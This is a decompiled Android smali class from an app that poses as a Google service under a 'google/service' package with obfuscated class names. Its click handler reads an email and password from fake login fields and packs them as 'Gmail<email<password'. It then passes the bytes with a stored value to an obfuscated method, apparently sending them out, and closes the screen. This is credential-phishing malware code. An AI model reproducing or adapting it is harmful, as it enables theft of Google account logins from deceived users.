.class Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$3;
.super Ljava/lang/Object;
.source "\u02be\u02be\u3164\ufe76\u02ce\u02bd\u02be\u05d9\u03c6\u02bf\u02c9\u02ce\u2db1\u2db1\u02c6\u03c6\u05d9\u02ca\u0640\u02c9\u02bd4788.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;


# direct methods
.method constructor <init>(Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;)V
    .locals 0

    .line 201
    iput-object p1, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$3;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 3

    .line 204
    iget-object p1, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$3;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    const v0, 0x7f050044

    invoke-virtual {p1, v0}, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/TextView;

    .line 205
    invoke-virtual {p1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    .line 206
    iget-object v0, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$3;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    const v1, 0x7f05002c

    invoke-virtual {v0, v1}, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    .line 207
    invoke-virtual {v0}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    .line 210
    :try_start_0
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v1

    const/4 v2, 0x3

    if-gt v1, v2, :cond_0

    const-string p1, "Please Check Your Email/Password."

    .line 211
    invoke-static {p1}, Lgoogle/service/θٴʼᵢʾⶱʿⶱˆˋᴵʻθˉೲᵔˎㅤㅤʾⶱʿ$ᵢˉˎᘣ4802;->showToast(Ljava/lang/String;)V

    return-void

    .line 215
    :cond_0
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    const/16 v2, 0x8

    if-ge v1, v2, :cond_1

    const-string p1, "Password Must At least 8 characters."

    .line 216
    invoke-static {p1}, Lgoogle/service/θٴʼᵢʾⶱʿⶱˆˋᴵʻθˉೲᵔˎㅤㅤʾⶱʿ$ᵢˉˎᘣ4802;->showToast(Ljava/lang/String;)V

    return-void

    .line 219
    :cond_1
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Gmail<"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "<"

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 221
    sget-object v0, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->sfh:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-static {v0, p1}, Lgoogle/service/ᴵˎˉθʾᵢⶱⶱʾ䉀ʾˑʼθʼ䉀ᘣיঙᵢ$ˉᵢˈㅤⶱ4773;->AumeVodcmCGNSRurHjuj4816(Ljava/lang/String;[B)V

    .line 222
    iget-object p1, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$3;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    const/4 v0, 0x1

    iput-boolean v0, p1, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->done:Z

    .line 223
    iget-object p1, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$3;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    invoke-virtual {p1}, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
